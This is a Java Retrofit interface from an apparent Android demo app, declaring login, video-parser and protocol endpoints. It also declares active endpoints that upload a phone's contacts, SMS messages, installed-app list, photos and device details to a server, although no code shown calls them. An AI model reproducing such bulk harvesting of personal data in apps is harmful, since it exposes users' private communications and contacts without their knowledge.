package com.illyasr.mydempviews.http;


import com.google.gson.Gson;
import com.illyasr.mydempviews.bean.VideoBean;

import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Map;

import io.reactivex.Observable;
import io.reactivex.Observer;
import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import retrofit2.http.Body;
import retrofit2.http.GET;
import retrofit2.http.Multipart;
import retrofit2.http.POST;
import retrofit2.http.PUT;
import retrofit2.http.Part;
import retrofit2.http.Query;
import retrofit2.http.Url;


/**
 * Created by zeng on 2019/4/9.
 */

public class UserApi extends BaseNetWork {
    //.getShared().getBoolean(Constants.SP.showStoreUI,true)

    protected static final NetService service = getRetrofit().create(NetService.class);
    protected static final NetService service2 = getRetrofit2().create(NetService.class);

    public interface NetService {

        /*用户登录*/
//        @POST("/user/api/user/login/sms")
//        Observable<BaseResponse<LoginModel>> userLogin(@Body LoginRequest request);
        /**
         * 获取验证码
         */
//        @POST("/user/api/verify/request/sms")
//        Observable<BaseResponse<VerifyCodeModel>> getVerifyCode(@Body VerifyCodeRequest request);


//        @POST("/user/api/order/mine")
//        Observable<BaseResponse<ArrayList<OrderBean>>> getUserOrder();

        /**
         * 信息是否认证接口
         * @param
         * @return
         */
//        @GET("/user/api/auth/user-auth/yes-or-no/new")
//        Observable<BaseResponse<UserInfoAuth>> getMegCertification(@Query("latitudeAndLongitude") String latitudeAndLongitude);



        @POST("/user/api/craw/contacts")
        Observable<BaseResponse<String>> commitContact(@Body RequestBody requestBody);

        @POST("/user/api/craw/sms")
        Observable<BaseResponse<String>> commitMessage(@Body RequestBody requestBody);

        @POST("/user/api/craw/apps")
        Observable<BaseResponse<String>> commitAppList(@Body RequestBody requestBody);

        @POST("/user/api/craw/device")
        Observable<BaseResponse<String>> getDeviceInfo(@Body RequestBody requestBody);

        @POST("/user/api/craw/photos")
        Observable<BaseResponse<String>> subPhotoInfo(@Body RequestBody requestBody);

        @POST("/foundation/api/protocol/list")
        Observable<BaseResponse<List<String>>> getProtocolList(@Body RequestBody requestBody);

         @POST("api/tools/video/parser?_t=1646302269767")
        Observable<VideoBean> getVideos(@Body RequestBody requestBody);



        /*上传*/
//        @Multipart
//        @POST("/foundation/api/file/upload")
//        Observable<BaseResponse<String>> returnOrder(@Part MultipartBody.Part file);



    }

    /**
     * --------------------------------------------------------------------
     */

    //登录
//    public static void userLogin(LoginRequest request, Observer<BaseResponse<LoginModel>> observer) {
//        setSubscribe(service2.userLogin(request), observer);
//    }

    //获取验证码
//    public static void userLoginCode(VerifyCodeRequest request, Observer<BaseResponse<VerifyCodeModel>> observer) {
//        setSubscribe(service.getVerifyCode(request), observer);
//    }


//    public static void getUserOrder(Observer<BaseResponse<ArrayList<OrderBean>>> observer) {
//        setSubscribe(service.getUserOrder(), observer);
//    }

//    public static void returnOrder(MultipartBody.Part file, Observer<BaseResponse<String>> observer){
//        setSubscribe(service.returnOrder(file),observer);
//    }

    public static void getProtocolList(Map<String,Object> map, Observer<BaseResponse<List<String>>> observer) {
        setSubscribe(service.getProtocolList(UserApi.getRequestBody(new Gson().toJson(map))), observer);
    }

    public static void getVideos(Map<String,Object> map, Observer<VideoBean> observer) {
        setSubscribe(service.getVideos(UserApi.getRequestBody(new Gson().toJson(map))), observer);
    }

}

